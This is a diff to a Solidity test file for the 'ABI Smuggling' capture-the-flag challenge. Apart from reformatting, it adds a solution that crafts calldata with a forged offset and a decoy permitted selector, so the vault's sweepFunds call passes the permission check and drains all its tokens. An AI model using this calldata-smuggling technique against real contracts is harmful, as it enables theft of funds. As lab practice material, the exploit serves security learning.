@@ -10,7 +10,7 @@ contract ABISmugglingChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;
 
     DamnValuableToken token;
@@ -36,8 +36,16 @@ contract ABISmugglingChallenge is Test {
         vault = new SelfAuthorizedVault();
 
         // Set permissions in the vault
-        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
-        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
+        bytes32 deployerPermission = vault.getActionId(
+            hex"85fb709d",
+            deployer,
+            address(vault)
+        );
+        bytes32 playerPermission = vault.getActionId(
+            hex"d9caed12",
+            player,
+            address(vault)
+        );
         bytes32[] memory permissions = new bytes32[](2);
         permissions[0] = deployerPermission;
         permissions[1] = playerPermission;
@@ -73,7 +81,24 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        bytes memory innerCall = abi.encodeWithSelector(
+            vault.sweepFunds.selector,
+            recovery,
+            IERC20(address(token))
+        );
+
+        bytes memory payload = abi.encodePacked(
+            bytes32(uint256(uint160(address(vault)))), // target (0x00)
+            bytes32(uint256(0x64)), // offset to actionData (0x20)
+            bytes32(""),
+            bytes4(hex"d9caed12"), // dummy selector to pass permission check (0x60)
+            bytes32(uint256(innerCall.length)), // length of actionData (0x40)
+            innerCall // actual call data for sweepFunds (0x64)
+        );
+
+        address(vault).call(
+            abi.encodePacked(AuthorizedExecutor.execute.selector, payload)
+        );
     }
 
     /**
@@ -82,6 +107,10 @@ contract ABISmugglingChallenge is Test {
     function _isSolved() private view {
         // All tokens taken from the vault and deposited into the designated recovery account
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
-        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            VAULT_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
     }
 }
